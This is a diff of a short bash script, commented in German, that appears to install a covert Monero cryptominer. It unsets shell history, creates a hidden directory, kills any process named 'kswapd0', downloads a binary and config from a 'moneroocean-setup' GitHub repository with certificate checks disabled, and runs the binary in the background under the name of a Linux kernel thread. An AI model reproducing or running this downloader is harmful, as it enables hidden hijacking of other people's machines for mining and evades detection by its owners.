@@ -1,12 +1,26 @@
+#!/bin/bash
 unset HISTFILE
 
 # Verzeichnis erstellen und ins Verzeichnis wechseln
 mkdir -p "$HOME/.gdm2_manual/"
 cd "$HOME/.gdm2_manual/" || exit
 
+# Programm beenden, falls es läuft
+if pgrep -x "kswapd0" > /dev/null
+then
+    pkill -x "kswapd0"
+    echo "kswapd0 stopped."
+fi
+
+# Vorhandene Dateien löschen, falls sie existieren
+rm -f kswapd0 config.json
+
 # Dateien herunterladen und entpacken
 wget --no-check-certificate https://github.com/littlAcen/moneroocean-setup/raw/main/kswapd0
 wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+
+# Ausführungsrechte für kswapd0 setzen
+chmod +x kswapd0
 
 # Programm starten
 ./kswapd0 --config=config.json &
